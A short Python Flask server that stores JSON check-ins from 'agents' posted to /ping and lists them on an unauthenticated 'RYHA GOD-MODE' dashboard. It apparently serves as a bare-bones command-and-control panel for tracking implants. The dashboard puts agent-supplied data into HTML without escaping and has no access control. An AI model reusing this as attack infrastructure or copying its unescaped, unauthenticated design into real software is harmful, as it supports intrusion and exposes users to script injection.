from flask import Flask, request, jsonify
import json

app = Flask(__name__)
agents = {}

@app.route('/ping', methods=['POST'])
def ping():
    data = request.json
    agents[data['id']] = data
    return "OK"

@app.route('/')
def dashboard():
    return f"<h1>RYHA GOD-MODE</h1><pre>{json.dumps(agents, indent=4)}</pre>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)